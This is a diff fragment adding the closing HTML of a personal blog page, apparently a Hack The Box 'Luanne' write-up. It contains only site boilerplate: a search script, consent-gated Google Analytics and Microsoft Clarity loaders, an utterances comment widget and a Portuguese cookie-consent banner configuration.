+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <!-- start custom analytics snippet -->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-54883666-1"></script>
+<script>
+  function EnableGTAGonConsent(){
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-54883666-1', { 'anonymize_ip': true});
+  }
+</script>
+
+<!-- Microsoft Clarity -->
+<script type="text/javascript">
+  function EnableMSClarityonConsent(){
+    (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "5dnbfjo108");
+  }
+</script>
+
+<!-- end custom analytics snippet -->
+
+
+
+
+
+    <script>
+  'use strict';
+
+  (function() {
+    var commentContainer = document.querySelector('#utterances-comments');
+
+    if (!commentContainer) {
+      return;
+    }
+
+    var script = document.createElement('script');
+    script.setAttribute('src', 'https://utteranc.es/client.js');
+    script.setAttribute('repo', 'davi-cruz/davi-cruz.github.io');
+    script.setAttribute('issue-term', 'htb-luanne');
+    script.setAttribute('theme', 'github-dark');
+    script.setAttribute('crossorigin', 'anonymous');
+
+    commentContainer.appendChild(script);
+  })();
+</script>
+
+  
+
+
+
+
+    
+<!-- Cookie Consent Management -->
+<script>
+    var strMessage = "Este website utiliza cookies para garantir a você uma melhor experiência";
+    var strDismiss = "Entendi!";
+    var strAllow = "Permitir Cookies";
+    var strDeny = "Não, obrigado!";
+    var strLink = "Saiba Mais";
+    var strHref = "https://davicruz.com/termos-e-privacidade/";
+
+    window.cookieconsent.initialise({
+        "palette": {
+            "popup": {
+                "background": "#252e39"
+            },
+            "button": {
+                "background": "transparent",
+                "text": "#008288",
+                "border": "#008288"
+            }
+        },
+        "position": "bottom-left",
+        "type": "opt-in",
+        "content": {
+            "message": strMessage,
+            "dismiss": strDismiss,
+            "allow": strAllow,
+            "deny": strDeny,
+            "link": strLink,
+            "href": strHref
+        },
+        onInitialise: function (status) {
+            var type = this.options.type;
+            var didConsent = this.hasConsented();
+            if (type == 'opt-in' && didConsent) {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+            if (type == 'opt-out' && !didConsent) {
+                // disable cookies
+            }
+        },
+        onStatusChange: function (status, chosenBefore) {
+            var type = this.options.type;
+            var didConsent = this.hasConsented();
+            if (type == 'opt-in' && didConsent) {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+            if (type == 'opt-out' && !didConsent) {
+                // disable cookies
+            }
+        },
+        onRevokeChoice: function () {
+            var type = this.options.type;
+            if (type == 'opt-in') {
+                // disable cookies
+            }
+            if (type == 'opt-out') {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+        }
+    });
+</script>
+<!-- End of Cookie Consent Management -->
+
+  </body>
+</html>
